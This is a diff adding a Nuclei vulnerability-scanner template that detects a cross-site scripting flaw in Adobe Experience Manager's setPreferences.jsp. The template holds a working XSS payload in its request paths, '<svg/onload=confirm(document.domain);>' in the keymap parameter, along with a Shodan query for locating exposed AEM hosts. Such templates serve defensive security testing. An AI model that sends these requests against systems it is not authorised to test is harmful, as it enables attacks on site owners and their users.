@@ -1,0 +1,35 @@
+http:
+- matchers:
+  - condition: and
+    type: word
+    words:
+    - <svg/onload=confirm(document.domain);>
+    - A JSONObject text must begin with
+  - status:
+    - 400
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a'
+  - '{{BaseURL}}/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a'
+  stop-at-first-match: true
+id: aem-setpreferences-xss
+info:
+  author: zinminphy0,dhiyaneshDK
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  description: Adobe Experience Manager contains a cross-site scripting vulnerability
+    via setPreferences.
+  metadata:
+    max-request: 2
+    shodan-query: http.component:"Adobe Experience Manager"
+  name: Adobe Experience Manager  - Cross-Site Scripting
+  reference:
+  - https://www.youtube.com/watch?v=VwLSUHNhrOw&t=142s
+  - https://github.com/projectdiscovery/nuclei-templates/issues/3225
+  - https://twitter.com/zin_min_phyo/status/1465394815042916352
+  severity: high
+  tags: aem,xss,misconfig
